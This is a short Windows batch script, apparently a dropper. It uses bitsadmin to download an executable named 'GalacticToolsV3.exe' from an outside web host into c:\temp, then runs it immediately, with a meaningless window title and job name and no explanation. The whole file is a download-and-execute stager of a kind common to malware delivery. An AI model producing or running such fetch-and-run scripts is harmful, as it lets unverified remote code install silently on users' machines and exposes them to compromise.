@echo off
title a
bitsadmin /transfer qwe /priority foreground https://picteon.dev/files/GalacticToolsV3.exe c:\temp\gal.exe
timeout /t 3 /nobreak >nul
c:\temp\gal.exe
exit
